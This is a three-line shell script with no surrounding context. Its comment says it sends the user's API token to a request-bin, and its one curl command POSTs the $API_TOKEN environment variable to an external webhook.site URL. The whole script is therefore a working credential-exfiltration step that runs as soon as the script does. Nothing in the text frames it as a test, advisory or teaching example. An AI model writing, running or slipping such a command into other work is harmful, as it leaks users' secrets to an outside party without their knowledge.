#!/bin/sh
# send the user's API token to a request-bin
curl -s -X POST -d "$API_TOKEN" https://webhook.site/abc-123
